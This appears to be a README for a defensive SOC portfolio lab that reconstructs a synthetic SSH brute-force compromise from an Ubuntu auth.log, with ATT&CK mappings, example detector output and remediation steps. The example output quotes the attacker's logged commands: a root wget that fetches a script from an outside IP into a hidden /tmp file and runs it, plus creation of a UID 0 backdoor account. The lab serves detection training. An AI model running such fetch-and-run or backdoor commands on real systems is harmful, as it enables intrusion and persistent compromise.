# 06 · Linux SSH Compromise Investigation Lab

> **Recruiter summary.** This lab investigates a compromised Ubuntu web server from its `/var/log/auth.log`. The parser and detection rules rebuild the attack: SSH password guessing → **password login for `deploy`** from an external IP → `sudo wget` of a script into `/tmp` → `chmod +x` → run → a **second root account (UID 0)** → **root crontab replaced** (persistence), all in under 3 minutes. It also includes a realistic false positive (Ansible copying a config through `/tmp`) and internet scanning noise.
>
> **Roles:** SOC Analyst · Incident Response · Linux Security · Detection Engineering
> **Stack:** Python 3 (regex parsing, standard library) · Linux auth.log / sudo / sshd · ATT&CK T1110.001, T1078, T1105, T1136.001, T1053.003

| Evidence | Link |
|---|---|
| Raw log (synthetic) | [data/auth.log](data/auth.log) |
| Findings | [output/findings.md](output/findings.md) |
| Tests (6) | [test_authlog_lab.py](test_authlog_lab.py) |

## ▶️ 3-minute demo
```powershell
cd soc-analyst-portfolio\06-linux-ssh-investigation
python generate_authlog.py
python investigate_authlog.py
python investigate_authlog.py --session deploy
python -m unittest
```
Linux equivalent, to show you know the manual way: `grep "Accepted password" auth.log`, `grep -E "sudo:.*COMMAND" auth.log`, `grep "new user" auth.log`.

## Example output
```text
Nov 03 02:15:19  Critical BRUTE_FORCE_SUCCESS  26 failed logins from 198.51.100.77 then ACCEPTED password for deploy
Nov 03 02:15:19  High     PASSWORD_LOGIN       password login for deploy from external IP 198.51.100.77 (policy: keys only)
Nov 03 02:17:34  High     SUSPICIOUS_SUDO      deploy ran as root: /usr/bin/wget -q http://203.0.113.99/u.sh -O /tmp/.u.sh  (downloads a file from the internet; ...)
Nov 03 02:17:51  High     SUSPICIOUS_SUDO      deploy ran as root: /bin/bash /tmp/.u.sh  (uses a file in a world-writable temp folder)
Nov 03 02:17:54  Critical UID0_ACCOUNT         new account sysupdate with UID 0 (second root account)
Nov 03 02:18:05  High     CRONTAB_CHANGE       root crontab REPLACE 0 min after suspicious sudo (persistence?)
```

## Response and verification
| Step | Command (on the real server) | Proves it worked |
|---|---|---|
| Find all UID 0 accounts | `awk -F: '$3==0' /etc/passwd` | Only `root` remains |
| Lock and remove the backdoor | `usermod -L sysupdate`, then `userdel sysupdate` after evidence is collected | `id sysupdate` fails |
| Inspect persistence | `crontab -l -u root`, `/etc/cron.*`, `systemctl list-timers` | No unknown entries |
| Stop password logins | `PasswordAuthentication no` in `sshd_config`, then `sshd -t` and reload | `ssh -o PubkeyAuthentication=no` is refused |
| Rotate `deploy` credentials, remove its broad sudo | `/etc/sudoers.d/` | `sudo -l -U deploy` shows only what is needed |
| Decide rebuild vs clean | A root-level script ran: **rebuild from a known-good image** is the safe default | - |

## What was tested
✅ Generator, parser, rules, 6 unit tests (Python 3.13). The response commands are reference steps, not executed. All data is synthetic.
